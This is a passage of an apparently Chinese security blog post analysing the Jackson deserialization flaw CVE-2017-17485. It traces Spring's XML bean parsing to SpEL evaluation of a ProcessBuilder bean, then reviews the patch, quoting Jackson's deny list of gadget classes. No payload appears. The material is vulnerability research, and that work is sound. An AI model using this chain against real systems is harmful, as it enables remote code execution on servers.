中有很多构造方法，其中有一个是传入一个字符串的（即配置文件的相对路径），但最终是调用的下面这个构造：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/ClassPathXmlApplicationContextConstructor.png" class><p>Spring 在这里先创建解析器，解析 configLocations，跟进 <code>refresh()</code> 方法，<code>refresh()</code> 方法做的核心业务是刷新容器（启动容器都会调用该方法），跟进之后的核心代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">refresh</span><span class="params">()</span> <span class="keyword">throws</span> BeansException, IllegalStateException &#123;  </span><br><span class="line">    <span class="keyword">synchronized</span> (<span class="built_in">this</span>.startupShutdownMonitor) &#123;  </span><br><span class="line">       <span class="comment">// Prepare this context for refreshing.  </span></span><br><span class="line">       prepareRefresh();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// Tell the subclass to refresh the internal bean factory.  </span></span><br><span class="line">       <span class="type">ConfigurableListableBeanFactory</span> <span class="variable">beanFactory</span> <span class="operator">=</span> obtainFreshBeanFactory();  </span><br><span class="line">  </span><br><span class="line">       <span class="comment">// Prepare the bean factory for use in this context.  </span></span><br><span class="line">       prepareBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">       <span class="keyword">try</span> &#123;  </span><br><span class="line">          <span class="comment">// Allows post-processing of the bean factory in context subclasses.  </span></span><br><span class="line">          postProcessBeanFactory(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Invoke factory processors registered as beans in the context.  </span></span><br><span class="line">          invokeBeanFactoryPostProcessors(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Register bean processors that intercept bean creation.  </span></span><br><span class="line">          registerBeanPostProcessors(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize message source for this context.  </span></span><br><span class="line">          initMessageSource();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize event multicaster for this context.  </span></span><br><span class="line">          initApplicationEventMulticaster();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Initialize other special beans in specific context subclasses.  </span></span><br><span class="line">          onRefresh();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Check for listener beans and register them.  </span></span><br><span class="line">          registerListeners();  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Instantiate all remaining (non-lazy-init) singletons.  </span></span><br><span class="line">          finishBeanFactoryInitialization(beanFactory);  </span><br><span class="line">  </span><br><span class="line">          <span class="comment">// Last step: publish corresponding event.  </span></span><br><span class="line">          finishRefresh();  </span><br><span class="line">       &#125;</span><br><span class="line">       </span><br><span class="line">.....</span><br></pre></td></tr></table></figure><p>先跟进 <code>obtainFreshBeanFactory()</code> 方法，这个方法是一个典型的<strong>模板方法模式</strong>的实现，第一步是准备初始化容器环境，这一步不重要，重点是第二步，创建 BeanFactory 对象、加载解析 xml 并封装成<strong>BeanDefinition</strong>对象都是在这一步完成的。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/obtainFreshBeanFactory.png" class><p>跟进，判断如果 BeanFactory 不为空，则清除 BeanFactory 和里面的实例，接着创建了一个 <strong>DefaultListableBeanFactory</strong> 对象并传入到了 <strong>loadBeanDefinitions</strong> 方法中，这也是一个模板方法，因为我们的配置不止有 xml，还有注解等。</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/refreshBeanFactory.png" class><p>在整体封装完毕之后，这里的 XML 就已经被加载进来了，把 inputSource 封装成 Document 文件对象。核心代码如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">loadBeanDefinitions</span><span class="params">(EncodedResource encodedResource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//获取Resource对象中的xml文件流对象</span></span><br><span class="line"><span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> encodedResource.getResource().getInputStream();</span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//InputSource是jdk中的sax xml文件解析对象</span></span><br><span class="line"><span class="type">InputSource</span> <span class="variable">inputSource</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InputSource</span>(inputStream);</span><br><span class="line"><span class="keyword">if</span> (encodedResource.getEncoding() != <span class="literal">null</span>) &#123;</span><br><span class="line">inputSource.setEncoding(encodedResource.getEncoding());</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//主要看这个方法</span></span><br><span class="line"><span class="keyword">return</span> doLoadBeanDefinitions(inputSource, encodedResource.getResource());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">finally</span> &#123;</span><br><span class="line">inputStream.close();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">protected</span> <span class="type">int</span> <span class="title function_">doLoadBeanDefinitions</span><span class="params">(InputSource inputSource, Resource resource)</span></span><br><span class="line"><span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line"><span class="comment">//把inputSource 封装成Document文件对象，这是jdk的API</span></span><br><span class="line"><span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> doLoadDocument(inputSource, resource);</span><br><span class="line"></span><br><span class="line"><span class="comment">//主要看这个方法，根据解析出来的document对象，拿到里面的标签元素封装成BeanDefinition</span></span><br><span class="line"><span class="type">int</span> <span class="variable">count</span> <span class="operator">=</span> registerBeanDefinitions(doc, resource);</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Loaded &quot;</span> + count + <span class="string">&quot; bean definitions from &quot;</span> + resource);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> count;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="type">int</span> <span class="title function_">registerBeanDefinitions</span><span class="params">(Document doc, Resource resource)</span> <span class="keyword">throws</span> BeanDefinitionStoreException &#123;</span><br><span class="line"><span class="comment">// 创建DefaultBeanDefinitionDocumentReader对象，并委托其做解析注册工作</span></span><br><span class="line"><span class="type">BeanDefinitionDocumentReader</span> <span class="variable">documentReader</span> <span class="operator">=</span> createBeanDefinitionDocumentReader();</span><br><span class="line"><span class="type">int</span> <span class="variable">countBefore</span> <span class="operator">=</span> getRegistry().getBeanDefinitionCount();</span><br><span class="line"><span class="comment">//主要看这个方法，需要注意createReaderContext方法中创建的几个对象</span></span><br><span class="line">documentReader.registerBeanDefinitions(doc, createReaderContext(resource));</span><br><span class="line"><span class="keyword">return</span> getRegistry().getBeanDefinitionCount() - countBefore;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> XmlReaderContext <span class="title function_">createReaderContext</span><span class="params">(Resource resource)</span> &#123;</span><br><span class="line"><span class="comment">// XmlReaderContext对象中保存了XmlBeanDefinitionReader对象和DefaultNamespaceHandlerResolver对象的引用，在后面会用到</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">XmlReaderContext</span>(resource, <span class="built_in">this</span>.problemReporter, <span class="built_in">this</span>.eventListener,</span><br><span class="line"><span class="built_in">this</span>.sourceExtractor, <span class="built_in">this</span>, getNamespaceHandlerResolver());</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doLoadBeanDefinitions.png" class><p>接着看看 <strong>DefaultBeanDefinitionDocumentReader</strong> 中是如何解析的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doRegisterBeanDefinitions</span><span class="params">(Element root)</span> &#123;</span><br><span class="line"><span class="comment">// 创建了BeanDefinitionParserDelegate对象</span></span><br><span class="line"><span class="type">BeanDefinitionParserDelegate</span> <span class="variable">parent</span> <span class="operator">=</span> <span class="built_in">this</span>.delegate;</span><br><span class="line"><span class="built_in">this</span>.delegate = createDelegate(getReaderContext(), root, parent);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 如果是Spring原生命名空间，首先解析 profile标签，这里不重要</span></span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">this</span>.delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line"><span class="type">String</span> <span class="variable">profileSpec</span> <span class="operator">=</span> root.getAttribute(PROFILE_ATTRIBUTE);</span><br><span class="line"><span class="keyword">if</span> (StringUtils.hasText(profileSpec)) &#123;</span><br><span class="line">String[] specifiedProfiles = StringUtils.tokenizeToStringArray(</span><br><span class="line">profileSpec, BeanDefinitionParserDelegate.MULTI_VALUE_ATTRIBUTE_DELIMITERS);</span><br><span class="line"><span class="comment">// We cannot use Profiles.of(...) since profile expressions are not supported</span></span><br><span class="line"><span class="comment">// in XML config. See SPR-12458 for details.</span></span><br><span class="line"><span class="keyword">if</span> (!getReaderContext().getEnvironment().acceptsProfiles(specifiedProfiles)) &#123;</span><br><span class="line"><span class="keyword">if</span> (logger.isDebugEnabled()) &#123;</span><br><span class="line">logger.debug(<span class="string">&quot;Skipped XML bean definition file due to specified profiles [&quot;</span> + profileSpec +</span><br><span class="line"><span class="string">&quot;] not matching: &quot;</span> + getReaderContext().getResource());</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">preProcessXml(root);</span><br><span class="line"></span><br><span class="line"><span class="comment">//主要看这个方法，标签具体解析过程</span></span><br><span class="line">parseBeanDefinitions(root, <span class="built_in">this</span>.delegate);</span><br><span class="line">postProcessXml(root);</span><br><span class="line"></span><br><span class="line"><span class="built_in">this</span>.delegate = parent;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里的调用栈是这么走下来的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">doRegisterBeanDefinitions:<span class="number">129</span>, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)</span><br><span class="line">registerBeanDefinitions:<span class="number">98</span>, DefaultBeanDefinitionDocumentReader (org.springframework.beans.factory.xml)</span><br><span class="line">registerBeanDefinitions:<span class="number">507</span>, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)</span><br><span class="line">doLoadBeanDefinitions:<span class="number">391</span>, XmlBeanDefinitionReader (org.springframework.beans.factory.xml)</span><br></pre></td></tr></table></figure><p>在这个方法中重点关注<strong>preProcessXml</strong>、<strong>parseBeanDefinitions</strong>、<strong>postProcessXml</strong>三个方法，其中 preProcessXml 和 postProcessXml 都是空方法，意思是在解析标签前后我们自己可以扩展需要执行的操作，也是一个模板方法模式，体现了 Spring 的高扩展性。然后进入 parseBeanDefinitions 方法看具体是怎么解析标签的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">parseBeanDefinitions</span><span class="params">(Element root, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (delegate.isDefaultNamespace(root)) &#123;</span><br><span class="line"><span class="type">NodeList</span> <span class="variable">nl</span> <span class="operator">=</span> root.getChildNodes();</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; nl.getLength(); i++) &#123;</span><br><span class="line"><span class="type">Node</span> <span class="variable">node</span> <span class="operator">=</span> nl.item(i);</span><br><span class="line"><span class="keyword">if</span> (node <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line"><span class="type">Element</span> <span class="variable">ele</span> <span class="operator">=</span> (Element) node;</span><br><span class="line"><span class="keyword">if</span> (delegate.isDefaultNamespace(ele)) &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//默认标签解析</span></span><br><span class="line">parseDefaultElement(ele, delegate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="comment">//自定义标签解析</span></span><br><span class="line">delegate.parseCustomElement(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">delegate.parseCustomElement(root);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里有两种标签的解析：<strong>Spring 原生标签</strong>和<strong>自定义标签</strong>。怎么区分这两种标签呢？</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 自定义标签</span></span><br><span class="line">&lt;context:component-scan/&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 默认标签</span></span><br><span class="line">&lt;bean:/&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>如上，带前缀的就是自定义标签，否则就是 Spring 默认标签，无论哪种标签在使用前都需要在 Spring 的 xml 配置文件里声明 Namespace URI，这样在解析标签时才能通过 Namespace URI 找到对应的 NamespaceHandler。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">xmlns:context=&quot;http://www.springframework.org/schema/context&quot;</span><br><span class="line"></span><br><span class="line">http://www.springframework.org/schema/beans</span><br></pre></td></tr></table></figure><p>可以看到 <code>http://www.springframework.org/schema/beans</code> 所对应的就是默认标签。接着，我们进入<strong>parseDefaultElement</strong>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">parseDefaultElement</span><span class="params">(Element ele, BeanDefinitionParserDelegate delegate)</span> &#123;</span><br><span class="line"><span class="comment">//import标签解析 </span></span><br><span class="line"><span class="keyword">if</span> (delegate.nodeNameEquals(ele, IMPORT_ELEMENT)) &#123;</span><br><span class="line">importBeanDefinitionResource(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//alias标签解析</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, ALIAS_ELEMENT)) &#123;</span><br><span class="line">processAliasRegistration(ele);</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//bean标签</span></span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, BEAN_ELEMENT)) &#123;</span><br><span class="line">processBeanDefinition(ele, delegate);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> (delegate.nodeNameEquals(ele, NESTED_BEANS_ELEMENT)) &#123;</span><br><span class="line"><span class="comment">// recurse</span></span><br><span class="line">doRegisterBeanDefinitions(ele);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>这里面主要是对 import、alias、bean 标签的解析以及 beans 的字标签的递归解析，最终会将这些标签属性的值装入到 BeanDefinition 对象中，这里接近能够拿到一个封装好的 XML document 了，并且被解析为 Bean。</p><p>回到最开始的地方，来关注一下漏洞点，其中有一个 <code>invokeBeanFactoryPostProcessors()</code> 方法，顾名思义，就是调用上下文中注册为 beans 的工厂处理器：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/invokeBeanFactoryPostProcessors.png" class><p>继续跟下去，<code>invokeBeanFactoryPostProcessors()</code> 方法中调用了 <code>getBeanNamesForType()</code> 函数来获取 Bean 名类型：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/getBeanNamesForType.png" class><p>往下，进一步调用 <code>doGetBeanNamesForType()</code> 方法：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doGetBeanNamesForType.png" class><p>在 <code>doGetBeanNamesForType()</code> 方法中，调用 <code>isFactoryBean()</code> 判断当前 beanName 是否为 FactoryBean，此时 beanName 参数值为 <strong>pb</strong>，mbd 参数中识别到 bean 标签中的类为 <code>java.lang.ProcessBuilder</code>：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/isFactoryBean.png" class><p>在 <code>isFactoryBean()</code> 方法中，调用 <code>predictBeanType()</code> 方法获取 Bean 类型：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/predictBeanType.png" class><p>跟下去，<code>AbstractBeanFactory.resolveBeanClass()-&gt;AbstractBeanFactory.doResolveBeanClass()</code>，用来解析 Bean 类，其中调用了 <code>evaluateBeanDefinitionString()</code> 方法来执行 Bean 定义的字符串内容，此时 className 参数指向 <code>java.lang.ProcessBuilder</code>：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/targetType.png" class><p>同时在这里第 432 行，<code>this.resolveBeanClass()</code> 方法是用于指定解析器的，我们跟进去看一下</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/doResolveBeanClass.png" class><p>跟进 <code>doResolveBeanClass()</code> 方法，进一步解析 Bean，随后跟进 <code>AbstractBeanFactory.evaluateBeanDefinitionString()</code> 方法，其中调用了 <code>this.beanExpressionResolver.evaluate()</code></p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/evaluateBeanDefinitionString.png" class><p>此时 <code>this.beanExpressionResolver</code> 指向的是 <code>StandardBeanExpressionResolver</code>，也就是说已经调用到对应的 SpEL 表达式解析器了：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/spelExpressionResolver.png" class><p>跟进 <code>StandardBeanExpressionResolver.evaluate()</code> 方法，发现调用了 Expression. getValue ()方法即 SpEL 表达式执行的方法，其中 sec 参数是我们可以控制的内容即由 spel. xml 解析得到的 SpEL 表达式：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/secSpEL.png" class><p>后续就是 SpEL 表达式注入漏洞导致的任意代码执行了。</p><p>至此，整个调用过程就大致过了遍。简单地说，就是传入的需要被反序列化的 <code>org.springframework.context.support.ClassPathXmlApplicationContext</code> 类，它的构造函数存在 SpEL 注入漏洞，进而导致可被利用来触发 Jackson 反序列化漏洞。</p><h2 id="0x04-补丁分析"><a href="#0x04-补丁分析" class="headerlink" title="0x04 补丁分析"></a>0x04 补丁分析</h2><p><a class="link" href="https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf">https://github.com/FasterXML/jackson-databind/commit/2235894210c75f624a3d0cd60bfb0434a20a18bf<i class="fas fa-external-link-alt"></i></a></p><p>换成 jackson-databind-2.7.9.2版本的 jar 试试，会报错，显示由于安全原因禁止了该非法类的反序列化操作：</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fix.png" class><p>但是去看黑名单的规则，其实并没有看到黑名单类里面有我们利用的这个类</p><p><code>com.fasterxml.jackson.databind.jsontype.impl.SubTypeValidator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">static</span> &#123;  </span><br><span class="line">    Set&lt;String&gt; s = <span class="keyword">new</span> <span class="title class_">HashSet</span>&lt;String&gt;();  </span><br><span class="line">    <span class="comment">// Courtesy of [https://github.com/kantega/notsoserial]:  </span></span><br><span class="line">    <span class="comment">// (and wrt [databind#1599])  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections.functors.InvokerTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections.functors.InstantiateTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections4.functors.InvokerTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.commons.collections4.functors.InstantiateTransformer&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.codehaus.groovy.runtime.ConvertedClosure&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.codehaus.groovy.runtime.MethodClosure&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.springframework.beans.factory.ObjectFactory&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;org.apache.xalan.xsltc.trax.TemplatesImpl&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1680]: may or may not be problem, take no chance  </span></span><br><span class="line">    s.add(<span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1737]; JDK provided  </span></span><br><span class="line">    s.add(<span class="string">&quot;java.util.logging.FileHandler&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;java.rmi.server.UnicastRemoteObject&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1737]; 3rd party  </span></span><br><span class="line">    <span class="comment">//s.add(&quot;org.springframework.aop.support.AbstractBeanFactoryPointcutAdvisor&quot;); // deprecated by [databind#1855]  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.springframework.beans.factory.config.PropertyPathFactoryBean&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.mchange.v2.c3p0.JndiRefForwardingDataSource&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.mchange.v2.c3p0.WrapperConnectionPoolDataSource&quot;</span>);  </span><br><span class="line">    <span class="comment">// [databind#1855]: more 3rd party  </span></span><br><span class="line">    s.add(<span class="string">&quot;org.apache.tomcat.dbcp.dbcp2.BasicDataSource&quot;</span>);  </span><br><span class="line">    s.add(<span class="string">&quot;com.sun.org.apache.bcel.internal.util.ClassLoader&quot;</span>);  </span><br><span class="line">    DEFAULT_NO_DESER_CLASS_NAMES = Collections.unmodifiableSet(s);  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>再往下看，这里会把所有 <code>org.springframe</code> 开头的类名做处理</p><img src="/2023/12/07/Jackson-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%88%E4%B8%89%EF%BC%89CVE-2017-17485/fullStartsBan.png" class><p>先进行黑名单过滤，发现类名不在黑名单后再判断是否是以 <code>org.springframe</code> 开头的类名，是的话循环遍历目标类的父类是否为 <code>AbstractPointcutAdviso</code> 或 <code>AbstractApplicationContext</code>，是的话跳出循环然后抛出异常：</p><p>而我们的利用类其继承关系是这样的：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">…-&gt;AbstractApplicationContext-&gt;AbstractRefreshableApplicationContext-&gt;AbstractRefreshableConfigApplicationContext-&gt;AbstractXmlApplicationContext-&gt;ClassPathXmlApplicationContext</span><br></pre></td></tr></table></figure><p>可以看到，ClassPathXmlApplicationContext 类是继承自 AbstractApplicationContext 类的，而该类会被过滤掉，从而没办法成功绕过利用。</p><h2 id="Ref"><a href="#Ref" class="headerlink" title="Ref"></a>Ref</h2><p><a class="link" 